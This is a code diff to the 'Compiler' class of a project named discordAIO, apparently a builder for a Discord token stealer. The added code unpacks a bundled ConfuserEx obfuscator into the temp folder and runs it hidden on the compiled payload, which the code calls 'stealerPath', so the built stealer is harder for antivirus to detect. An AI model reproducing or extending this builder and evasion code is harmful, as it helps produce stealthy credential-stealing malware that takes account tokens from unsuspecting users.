@@ -11,12 +11,14 @@ using System.Windows.Forms;
 using System.IO;
 using RestSharp;
 using Newtonsoft.Json.Linq;
+using Microsoft.VisualBasic;
+using System.IO.Compression;
 
 namespace discordAIO
 {
 	internal class Compiler
 	{
-		public static bool AIOcompilation(string string_1, string string_2, string string_3 = null)
+		public static bool AIOcompilation(string string_1, string string_2, bool obfuscateMe, string string_3 = null)
 		{
 			string iconenv = Environment.CurrentDirectory + "\\icon.ico";
 			Dictionary<string, string> dictionary = new Dictionary<string, string>();
@@ -57,12 +59,37 @@ namespace discordAIO
 							compilerError.FileName
 						}), "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
 					}
-				}
+				} else
+                {
+					if (obfuscateMe)
+                    {
+						Confuser(string_2, string_2);
+                    }
+                }
 				File.Delete(iconenv);
 				result = (compilerResults.Errors.Count == 0);
 			}
 			return result;
 		}
+		private static void Confuser(string file, string output)
+		{
+			File.WriteAllBytes(Path.GetTempPath() + "confuser.zip", Properties.Resources.ConfuserEx);
+
+			if (Directory.Exists(Path.GetTempPath() + "Confuser"))
+			{
+				Directory.Delete(Path.GetTempPath() + "Confuser", true);
+				Directory.CreateDirectory(Path.GetTempPath() + "Confuser");
+			}
+
+			ZipFile.ExtractToDirectory(Path.GetTempPath() + "confuser.zip", Path.GetTempPath() + "Confuser");
+
+			string stealerPath = Path.GetFullPath(file);
+
+			Interaction.Shell(Path.GetTempPath() + @"Confuser\Confuser.CLI.exe -n " + stealerPath, AppWinStyle.Hide, true);
+
+			File.Delete(Path.GetTempPath() + "confuser.zip");
+		}
+
 		private static readonly string[] string_0 = new string[]
 		{
 			  "System.Net.dll",
